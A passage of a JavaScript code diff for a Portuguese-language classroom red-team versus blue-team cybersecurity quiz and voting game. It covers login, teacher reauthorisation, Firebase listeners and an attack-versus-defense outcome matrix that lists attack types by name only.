+  {name:"Infraestrutura DNS",ctx:"Servidor DNS que resolve domínios da empresa"},
+];
+const ATK=[{id:"ddos",n:"DDoS",i:"💥"},{id:"phishing",n:"Phishing",i:"🎣"},{id:"xss",n:"XSS",i:"💉"},{id:"ransom",n:"Ransomware",i:"🔒"},{id:"social",n:"Eng. Social",i:"🎭"},{id:"mitm",n:"Man in the Middle",i:"👤"},{id:"sqli",n:"SQL Injection",i:"🗄️"},{id:"brute",n:"Brute Force",i:"🔨"},{id:"malvert",n:"Malvertising",i:"📢"},{id:"keylog",n:"Keylogger",i:"⌨️"}];
+const DEF=[{id:"firewall",n:"Firewall",i:"🛡️"},{id:"antivirus",n:"Antivírus",i:"🦠"},{id:"mfa",n:"2FA",i:"🔑"},{id:"backup",n:"Backup",i:"💾"},{id:"vpn",n:"VPN",i:"🔐"},{id:"training",n:"Treinamento",i:"📚"},{id:"waf",n:"WAF",i:"🌐"},{id:"crypto",n:"Criptografia",i:"🔏"},{id:"ids",n:"IDS/IPS",i:"👁️"},{id:"policy",n:"Pol. Senhas",i:"📋"}];
+const MX={0:{ddos:{firewall:'draw',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'draw',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'draw',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},brute:{firewall:'draw',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'draw',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'draw',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'red',ids:'red',policy:'red'}},1:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'draw',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'draw',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'blue',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'blue',ids:'red',policy:'red'}},2:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'draw',policy:'red'},phishing:{firewall:'red',antivirus:'draw',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'draw',waf:'red',crypto:'red',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'red',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'draw',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'red',ids:'red',policy:'red'}},3:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'draw',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'draw',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'}},4:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'draw',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'draw',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'draw',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'draw',antivirus:'red',mfa:'blue',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'draw',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'}},5:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'draw',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'draw',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'draw',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'blue',ids:'red',policy:'red'}},6:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'draw',training:'red',waf:'red',crypto:'red',ids:'red',policy:'red'},phishing:{firewall:'red',antivirus:'draw',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'draw',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'blue',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'blue',training:'draw',waf:'red',crypto:'blue',ids:'red',policy:'red'}},7:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'draw',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'draw',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'red',ids:'red',policy:'red'}},8:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'draw',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'draw',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'draw',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'draw',crypto:'red',ids:'red',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'blue',ids:'red',policy:'red'}},9:{ddos:{firewall:'blue',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'draw',crypto:'red',ids:'blue',policy:'red'},phishing:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},xss:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'red',ids:'draw',policy:'red'},ransom:{firewall:'red',antivirus:'blue',mfa:'red',backup:'blue',vpn:'red',training:'red',waf:'red',crypto:'blue',ids:'red',policy:'red'},social:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'red',policy:'red'},mitm:{firewall:'draw',antivirus:'red',mfa:'red',backup:'red',vpn:'blue',training:'red',waf:'red',crypto:'blue',ids:'blue',policy:'red'},sqli:{firewall:'red',antivirus:'red',mfa:'red',backup:'red',vpn:'red',training:'red',waf:'blue',crypto:'draw',ids:'blue',policy:'red'},brute:{firewall:'red',antivirus:'red',mfa:'blue',backup:'red',vpn:'red',training:'red',waf:'red',crypto:'red',ids:'blue',policy:'blue'},malvert:{firewall:'red',antivirus:'blue',mfa:'red',backup:'red',vpn:'red',training:'blue',waf:'red',crypto:'red',ids:'draw',policy:'red'},keylog:{firewall:'red',antivirus:'blue',mfa:'blue',backup:'red',vpn:'red',training:'draw',waf:'red',crypto:'blue',ids:'red',policy:'red'}}};
 
-// ── SELEÇÃO DE EQUIPE ───────────────────────────
-window.selectTeam = function(team) {
-  playerTeam = team;
-  const btnRed  = document.getElementById('btn-red');
-  const btnBlue = document.getElementById('btn-blue');
-  btnRed.className  = 'team-btn' + (team==='red'  ? ' selected-red'  : '');
-  btnBlue.className = 'team-btn' + (team==='blue' ? ' selected-blue' : '');
+
+// ── ESTADO ────────────────────────────────────────────────
+let pName='',pTeam='',pId='',pToken='';
+let labUrl='',listening=false;
+let curQ=0,selOpt=null,answered=false,qTmr=null,qTime=120;
+let curRound=0,myVote=null,voted=false,bTmr=null,bTime=90;
+let f1R=0,f1B=0,lastRound=-1;
+
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+window.selectTeam=function(t){
+  pTeam=t;
+  document.getElementById('btn-red').className='team-btn'+(t==='red'?' sel-red':'');
+  document.getElementById('btn-blue').className='team-btn'+(t==='blue'?' sel-blue':'');
 };
 
-// ── REGISTRO ────────────────────────────────────
-window.doRegister = async function() {
-  const code = document.getElementById('inp-code').value.trim();
-  const nameRaw = document.getElementById('inp-name').value.trim();
-  const errEl = document.getElementById('msg-error');
-  const infoEl = document.getElementById('msg-info');
-  errEl.style.display='none'; infoEl.style.display='none';
-
-  if (!code || !nameRaw || !playerTeam) {
-    errEl.textContent='⚠ Preencha o código da turma, seu nome e selecione uma equipe.';
-    errEl.style.display='block'; return;
-  }
-
-  // Normalizar nome: sem espaços duplos, sem acento de maiúsculas para comparação
-  // Mantém o nome original para exibição mas usa normalizado como ID
-  const nameTrimmed = nameRaw.replace(/\s+/g,' ').trim();
-  const nameNorm = nameTrimmed.toLowerCase().replace(/\s+/g,'_');
-
-  infoEl.textContent='Verificando código da turma...';
-  infoEl.style.display='block';
-  try {
-    const cfgSnap = await getDoc(doc(db,'config','session'));
-    if (!cfgSnap.exists()) {
-      errEl.textContent='⚠ Sessão não configurada. Aguarde o professor.';
-      errEl.style.display='block'; infoEl.style.display='none'; return;
-    }
-    const cfg = cfgSnap.data();
-    if (cfg.code !== code) {
-      errEl.textContent='⚠ Código da turma incorreto. Verifique com o professor.';
-      errEl.style.display='block'; infoEl.style.display='none'; return;
-    }
-
-    // Verificar se jogo já iniciou
-    const gameSnap = await getDoc(doc(db,'game','state'));
-    const gameData = gameSnap.exists() ? gameSnap.data() : {};
-    if (gameData.status === 'running' || gameData.status === 'ended') {
-      errEl.textContent='⚠ O jogo já está em andamento. Não é possível entrar agora.';
-      errEl.style.display='block'; infoEl.style.display='none'; return;
-    }
-
-    // Verificar se nome já existe usando ID normalizado
-    const playersSnap = await getDoc(doc(db,'players', nameNorm));
-    if (playersSnap.exists()) {
-      const existing = playersSnap.data();
-      // Reacesso — usa o nome ORIGINAL já cadastrado
-      sessionToken = Date.now().toString();
-      playerId   = nameNorm;
-      playerName = existing.name; // preserva o nome original do cadastro
-      playerTeam = existing.team; // preserva a equipe original
-
-      if (existing.status === 'approved' || existing.status === 'denied') {
-        await updateDoc(doc(db,'players', playerId), {
-          status: 'reauth_pending',
-          sessionToken,
-          reconnectedAt: serverTimestamp()
-        });
-        showWait('reauth');
-        listenGame();
-        return;
+window.doLogin=async function(){
+  const code=document.getElementById('inp-code').value.trim();
+  const raw=document.getElementById('inp-name').value.trim();
+  const err=document.getElementById('login-err');
+  const info=document.getElementById('login-info');
+  err.style.display='none';info.style.display='none';
+  if(!code||!raw||!pTeam){err.textContent='⚠ Preencha código, nome e equipe.';err.style.display='block';return;}
+  const name=raw.replace(/\s+/g,' ').trim();
+  const nid=name.toLowerCase().replace(/\s+/g,'_');
+  info.textContent='Verificando...';info.style.display='block';
+  try{
+    const cfg=await getDoc(doc(db,'config','session'));
+    if(!cfg.exists()||!cfg.data().code){err.textContent='⚠ Sessão não configurada.';err.style.display='block';info.style.display='none';return;}
+    if(cfg.data().code!==code){err.textContent='⚠ Código incorreto.';err.style.display='block';info.style.display='none';return;}
+    const gs=await getDoc(doc(db,'game','state'));
+    const gd=gs.exists()?gs.data():{};
+    if(gd.status==='running'||gd.status==='ended'){err.textContent='⚠ Jogo já iniciado.';err.style.display='block';info.style.display='none';return;}
+    pId=nid;pToken=Date.now().toString();
+    const ex=await getDoc(doc(db,'players',pId));
+    if(ex.exists()){
+      const d=ex.data();pName=d.name;pTeam=d.team;
+      if(d.status==='approved'||d.status==='denied'){
+        await updateDoc(doc(db,'players',pId),{status:'reauth_pending',sessionToken:pToken,reconnectedAt:serverTimestamp()});
+        showWait('reauth');startListening();return;
       }
-      if (existing.status === 'reauth_pending') {
-        showWait('reauth');
-        listenGame();
-        return;
-      }
+      if(d.status==='reauth_pending'){showWait('reauth');startListening();return;}
     }
-
-    // Novo registro — salva nome com capitalização original
-    playerName = nameTrimmed;
-    playerId   = nameNorm;
-    sessionToken = Date.now().toString();
-    infoEl.textContent='✓ Registrando agente...';
-    await setDoc(doc(db,'players', playerId), {
-      name: playerName,
-      team: playerTeam,
-      status: 'approved',
-      sessionToken,
-      registeredAt: serverTimestamp()
-    });
-    showWait('normal');
-    listenGame();
-  } catch(e) {
-    errEl.textContent='⚠ Erro: ' + e.message;
-    errEl.style.display='block'; infoEl.style.display='none';
-  }
+    pName=name;
+    await setDoc(doc(db,'players',pId),{name:pName,team:pTeam,status:'approved',sessionToken:pToken,registeredAt:serverTimestamp()});
+    showWait('normal');startListening();
+  }catch(e){err.textContent='⚠ Erro: '+e.message;err.style.display='block';info.style.display='none';}
 };
 
-// ── TELA DE ESPERA ──────────────────────────────
-function showWait(mode) {
-  document.getElementById('screen-login').style.display='none';
-  document.getElementById('screen-wait').style.display='block';
-  document.getElementById('wait-name').textContent = '// ' + playerName.toUpperCase() + ' //';
-  const badge = document.getElementById('badge-wait');
-  badge.innerHTML = `<span class="badge ${playerTeam}">${playerTeam==='red'?'🔴 EQUIPE VERMELHA':'🔵 EQUIPE AZUL'}</span>`;
-  if (mode === 'reauth') {
-    document.getElementById('wait-title').textContent = 'RECONEXÃO DETECTADA';
-    document.getElementById('wait-icon').textContent = '⏳';
-    document.getElementById('wait-msg').textContent = 'Aguarde o professor autorizar seu reacesso.';
+function showWait(mode){
+  showPage('p-wait');
+  document.getElementById('wait-name').textContent='// '+pName.toUpperCase()+' //';
+  document.getElementById('wait-badge').innerHTML=`<span class="badge ${pTeam}" style="margin-bottom:10px;">${pTeam==='red'?'🔴 EQUIPE VERMELHA':'🔵 EQUIPE AZUL'}</span>`;
+  if(mode==='reauth'){
+    document.getElementById('wait-title').textContent='RECONEXÃO DETECTADA';
+    document.getElementById('wait-icon').textContent='⏳';
+    document.getElementById('wait-msg').textContent='Aguarde o professor autorizar seu reacesso.';
     document.getElementById('reauth-box').style.display='block';
-  } else {
-    document.getElementById('wait-title').textContent = 'AGUARDANDO INÍCIO';
-    document.getElementById('wait-icon').textContent = '⚡';
-    document.getElementById('wait-msg').textContent = 'O professor irá iniciar a batalha em breve...';
+  }else{
+    document.getElementById('wait-title').textContent='AGUARDANDO INÍCIO';
+    document.getElementById('wait-icon').textContent='⚡';
+    document.getElementById('wait-msg').textContent='O professor irá iniciar em breve...';
+    document.getElementById('reauth-box').style.display='none';
   }
 }
 
-// ── LISTENERS ───────────────────────────────────
-function listenGame() {
-  // Contar jogadores conectados
-  onSnapshot(collection(db,'players'), snap => {
-    document.getElementById('wait-count').textContent = snap.size;
+function startListening(){
+  if(listening)return;listening=true;
+  onSnapshot(collection(db,'players'),snap=>{
+    const el=document.getElementById('wait-count');if(el)el.textContent=snap.size;
   });
-
-  // Escutar status do próprio jogador (reautorização)
-  onSnapshot(doc(db,'players', playerId), snap => {
-    if (!snap.exists()) return;
-    const data = snap.data();
-    if (data.status === 'approved' && data.sessionToken === sessionToken) {
-      document.getElementById('reauth-box').style.display='none';
-      document.getElementById('wait-title').textContent = 'AGUARDANDO INÍCIO';
-      document.getElementById('wait-icon').textContent = '⚡';
-      document.getElementById('wait-msg').textContent = 'Reacesso autorizado! Aguardando o professor iniciar.';
+  onSnapshot(doc(db,'players',pId),snap=>{
+    if(!snap.exists())return;const d=snap.data();
+    if(d.status==='approved'&&d.sessionToken===pToken){
+      const rb=document.getElementById('reauth-box');if(rb)rb.style.display='none';
+      const wt=document.getElementById('wait-title');if(wt)wt.textContent='AGUARDANDO INÍCIO';
+      const wi=document.getElementById('wait-icon');if(wi)wi.textContent='⚡';
+      const wm=document.getElementById('wait-msg');if(wm)wm.textContent='Reacesso autorizado! Aguardando o professor.';
     }
-    if (data.status === 'denied') {
-      document.getElementById('screen-wait').style.display='none';
-      document.getElementById('screen-login').style.display='block';
-      const err=document.getElementById('msg-error');
-      err.textContent='⚠ Seu reacesso foi negado pelo professor. Entre em contato com ele.';
-      err.style.display='block';
+    if(d.status==='denied'){
+      showPage('p-login');
+      const e=document.getElementById('login-err');e.textContent='⚠ Reacesso negado pelo professor.';e.style.display='block';
+      listening=false;
     }
   });
-
-  // Escutar link do laboratório
-  onSnapshot(doc(db,'lab','link'), snap => {
-    if (!snap.exists()) return;
-    const data = snap.data();
-    if (data.active && data.url) {
-      labUrl = data.url;
-      document.getElementById('lab-box').style.display = 'block';
-    } else {
-      document.getElementById('lab-box').style.display = 'none';
+  onSnapshot(doc(db,'lab','link'),snap=>{
+    if(!snap.exists())return;const d=snap.data();
+    const box=document.getElementById('lab-box');
+    if(d.active&&d.url){labUrl=d.url;if(box)box.style.display='block';}
+    else{if(box)box.style.display='none';}
+  });
+  onSnapshot(doc(db,'game','state'),snap=>{
+    if(!snap.exists())return;const d=snap.data();
+    if(d.status==='running'&&d.currentQuestion!==undefined){
+      if(document.getElementById('p-wait').classList.contains('active'))initQuizUI();
+      loadQ(d.currentQuestion,d.questionStartedAt);
+      const sr=document.getElementById('q-sr');if(sr)sr.textContent=d.scoreRed||0;
+      const sb=document.getElementById('q-sb');if(sb)sb.textContent=d.scoreBlue||0;
+      const qp=document.getElementById('q-prog');if(qp)qp.textContent=(d.currentQuestion+1)+'/25';
+      const pf=document.getElementById('q-pfill');if(pf)pf.style.width=((d.currentQuestion+1)/25*100)+'%';
+    }
+    if(d.status==='result')showQRes(d);
+    if(d.status==='paused')clearInterval(qTmr);
+    if(d.status==='ended'){
+      f1R=d.scoreRed||0;f1B=d.scoreBlue||0;
+      const s1r=document.getElementById('sb1-sr');if(s1r)s1r.textContent=f1R;
+      const s1b=document.getElementById('sb1-sb');if(s1b)s1b.textContent=f1B;
+      showPage('p-standby1');
     }
   });
-
-  // Escutar estado do jogo
-  onSnapshot(doc(db,'game','state'), snap => {
-    if (!snap.exists()) return;
-    const data = snap.data();
-    if (data.status === 'running' && data.currentQuestion !== undefined) {
-      if (document.getElementById('screen-wait').style.display !== 'none') showQuiz();
-      loadQuestion(data.currentQuestion, data.questionStartedAt);
-      document.getElementById('q-sr').textContent = data.scoreRed||0;
-      document.getElementById('q-sb').textContent = data.scoreBlue||0;
-      document.getElementById('q-prog').textContent = (data.currentQuestion+1)+'/25';
-      document.getElementById('q-pfill').style.width = ((data.currentQuestion+1)/25*100)+'%';
+  onSnapshot(doc(db,'game2','state'),snap=>{
+    if(!snap.exists())return;const d=snap.data();
+    if(d.status==='running'&&d.currentRound!==undefined){
+      const onStandby=document.getElementById('p-standby1').classList.contains('active');
+      const onWait=document.getElementById('p-wait').classList.contains('active');
+      if(onStandby||onWait)initBattleUI();
+      loadRound(d.currentRound,d.roundStartedAt);
+      const br=document.getElementById('b-sr');if(br)br.textContent=d.scoreRed||0;
+      const bb=document.getElementById('b-sb');if(bb)bb.textContent=d.scoreBlue||0;
+      const brd=document.getElementById('b-round');if(brd)brd.textContent=(d.currentRound+1)+'/10';
+      const bp=document.getElementById('b-pfill');if(bp)bp.style.width=((d.currentRound+1)/10*100)+'%';
+      renderDots(d.currentRound,d.roundResults||[]);
     }
-    if (data.status === 'result') showResult(data);
-    if (data.status === 'ended')  showEnd(data);
-    if (data.status === 'paused') clearInterval(timerInterval);
+    if(d.status==='result')showBRes(d);
+    if(d.status==='paused')clearInterval(bTmr);
+    if(d.status==='ended'){
+      const tr=(f1R)+(d.scoreRed||0),tb=(f1B)+(d.scoreBlue||0);
+      const fr=document.getElementById('fim-sr');if(fr)fr.textContent=tr;
+      const fb=document.getElementById('fim-sb');if(fb)fb.textContent=tb;
+      const w=document.getElementById('fim-winner');
+      if(w){
+        if(tr>tb){w.textContent='🏆 VITÓRIA DA EQUIPE VERMELHA!';w.style.color='var(--red)';}
+        else if(tb>tr){w.textContent='🏆 VITÓRIA DA EQUIPE AZUL!';w.style.color='var(--blue)';}
+        else{w.textContent='⚡ EMPATE GERAL!';w.style.color='var(--green)';}
+      }
+      showPage('p-fim');
+    }
+  });
+  onSnapshot(collection(db,'votes2'),snap=>{
+    const counts={};
+    snap.forEach(v=>{const d=v.data();if(d.round===curRound&&d.team===pTeam)counts[d.choice]=(counts[d.choice]||0)+1;});
+    const items=pTeam==='red'?ATK:DEF;
+    items.forEach(it=>{const el=document.getElementById('vc-'+it.id);if(el)el.textContent=counts[it.id]?counts[it.id]+'x':'';});
   });
 }
 
-window.openLab = function() {
-  if (labUrl) window.location.href = labUrl;
+// LAB
+window.goToLab=function(){showPage('p-lab');};
+window.finishLab=function(){
+  showWait('normal');
+  const wi=document.getElementById('wait-icon');if(wi)wi.textContent='✅';
+  const wm=document.getElementById('wait-msg');if(wm)wm.textContent='✅ Laboratório concluído! Aguardando o professor iniciar a Fase 1.';
 };
 
-function showQuiz() {
-  document.getElementById('screen-wait').style.display='none';
-  document.getElementById('screen-quiz').style.display='block';
-  const badge = document.getElementById('badge-quiz');
-  badge.innerHTML = `
-    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;
-      padding:8px 12px;background:#060c18;border:1px solid var(--border);border-radius:5px;">
-      <span class="badge ${playerTeam}" style="margin:0;">${playerTeam==='red'?'🔴 VERMELHA':'🔵 AZUL'}</span>
